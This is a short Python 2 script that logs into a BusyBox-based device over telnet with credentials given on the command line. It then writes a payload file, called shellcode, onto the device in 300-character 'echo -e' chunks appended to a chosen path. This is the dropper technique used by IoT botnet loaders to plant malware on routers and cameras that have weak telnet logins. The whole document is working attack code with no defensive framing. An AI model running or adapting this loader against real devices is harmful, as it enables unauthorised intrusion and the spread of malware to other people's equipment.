#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
import telnetlib
import time

def try_telnet_send(host, port, username, password, shellcode, location, timeout):
    try:
        hlr = telnetlib.Telnet(host, port, timeout)
    except Exception, e:
        print "couldn't even connect"
        return False
    try:
        login_response = ""
        print "waiting for login"
        login_prompt = hlr.expect([r'USERCODE',r'usercode',r'login',
                r'Login', r'LOGIN'], timeout)
        if login_prompt[0] == -1:
            hlr.close()
            return False
        print "got login"
        hlr.write(username+"\n")
        print "waiting for password"
        login_prompt = hlr.expect([r'password',r'Password',r'PASSWORD'], timeout)
        if login_prompt[0] == -1:
            hlr.close()
            return False
        print "got password"
        hlr.write(password+"\n")
        print "waiting for busybox"
        login_prompt = hlr.expect([r'BusyBox',r'busybox', 'Busybox', 'BUSYBOX'], timeout)
        if login_prompt[0] == -1:
            hlr.close()
            return False

        print "waiting for prompt"
        login_prompt = hlr.expect(["\$"], timeout)
        if login_prompt[0] == -1:
            hlr.close()
            return False

        print "writing bin"
        content = open(shellcode).read().rstrip()
        for a in xrange(0, len(content), 300):
            print "sent split"
            print str(a)+"/"+str(len(content))
            command = 'echo -e "'+content[a:a+300]+'" >> '+ location +'\n\n'
            hlr.write(command)
            time.sleep(0.3)
        print "wrote hex"
        hlr.close()
        return True
    except Exception, e:
        hlr.close()
        print e
        return False


try_telnet_send(sys.argv[1], 23, sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], 1000000)
